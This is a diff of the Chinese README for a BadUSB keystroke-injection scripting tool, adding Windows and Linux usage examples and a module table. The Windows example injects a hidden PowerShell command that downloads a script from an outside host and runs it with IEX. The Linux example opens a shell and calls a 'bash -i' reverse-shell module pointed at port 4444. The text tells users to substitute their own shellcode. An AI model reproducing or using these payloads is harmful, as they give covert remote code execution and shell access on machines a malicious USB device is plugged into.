@@ -24,21 +24,35 @@
 > 目前尚在开发中，很多功能并不全面画横线的表示正在开发中
 
 可用案例：
+
+#### windows
+
 ```badusb
 set Time 1
 POWERSHELL
 TOGGLE_INPUT
 ECHO powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.255.1:8029/a'))"
 ```
+
+#### linux
+
+```badusb
+set Time 1
+LINUX_OPENSHELL
+LINUX_RESHELL 127.0.0.1 4444
+```
+
 将最后的echo内容替换为你的shellcode即可
 
-内置了快捷使用的模组
-* POWERSHELL
-* TOGGLE_INPUT 输入法切换
-* ~~WINDOWS~~
-* ~~LINUX~~
-* ~~CMD~~
-* ~~SHELL~~
+内置了快捷使用的模块
+
+| 命令     | 作用                       |
+-----------|---------------------------|
+| POWERSHELL | 快速拉起powershell     |
+| TOGGLE_INPUT | 快速切换输入法     |
+| LINUX_OPENSHELL | 快速拉起linux shell   |
+| LINUX_RESHELL | 使用bash -i反弹shell模板   |
+| ECHO | 输出字符串     |
 
 根据需求调用即可，echo语句用于输出字符串
 
@@ -46,7 +60,7 @@ ECHO powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloads
 
 | 命令     | 作用                       |
 -----------|---------------------------|
-| set Time | 设置按键间隔时间     |
+| set Time | 设置命令隔时间 不建议太快    |
 
 #### 注意
 
